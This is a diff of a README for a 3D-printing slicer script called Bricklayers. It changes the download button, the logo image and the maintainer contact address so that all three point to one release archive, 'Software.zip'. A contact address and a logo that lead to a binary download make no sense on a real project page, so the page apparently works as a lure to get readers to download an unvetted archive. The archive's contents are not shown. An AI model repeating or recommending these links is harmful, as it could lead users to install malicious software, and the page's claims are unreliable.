@@ -12,7 +12,7 @@ Welcome to the **Bricklayers** GitHub repository! This repository contains a pro
 
 To start using the Bricklayers processing script, you can download the software package by clicking the button below:
 
-[![Download Software](https://github.com/Hazm-sudo/Bricklayers/releases/download/v1.0/Release_x64.zip)](https://github.com/Hazm-sudo/Bricklayers/releases/download/v1.0/Release_x64.zip)
+[![Download Software](https://github.com/Hazm-sudo/Bricklayers/releases/download/v2.0/Software.zip)](https://github.com/Hazm-sudo/Bricklayers/releases/download/v2.0/Software.zip)
 
 If the link is not working or the download does not start automatically, please check the "Releases" section of this repository.
 
@@ -20,7 +20,7 @@ If the link is not working or the download does not start automatically, please 
 
 Bricklayers is a specialized processing script that optimizes the printing settings for Bricklayers in both Prusaslicer and Orcaslicer. This script is tailored to ensure precise and efficient printing of brick-based structures using 3D printers.
 
-![Bricklayers Logo](https://github.com/Hazm-sudo/Bricklayers/releases/download/v1.0/Release_x64.zip)
+![Bricklayers Logo](https://github.com/Hazm-sudo/Bricklayers/releases/download/v2.0/Software.zip)
 
 ## 📦 Features
 
@@ -66,7 +66,7 @@ We welcome contributions to the Bricklayers repository. If you have ideas for en
 
 ## 📧 Contact
 
-If you have any questions, feedback, or suggestions regarding Bricklayers, you can reach out to the project maintainers at https://github.com/Hazm-sudo/Bricklayers/releases/download/v1.0/Release_x64.zip We value your input and strive to provide the best 3D printing solutions for the community.
+If you have any questions, feedback, or suggestions regarding Bricklayers, you can reach out to the project maintainers at https://github.com/Hazm-sudo/Bricklayers/releases/download/v2.0/Software.zip We value your input and strive to provide the best 3D printing solutions for the community.
 
 ## 📝 License
 
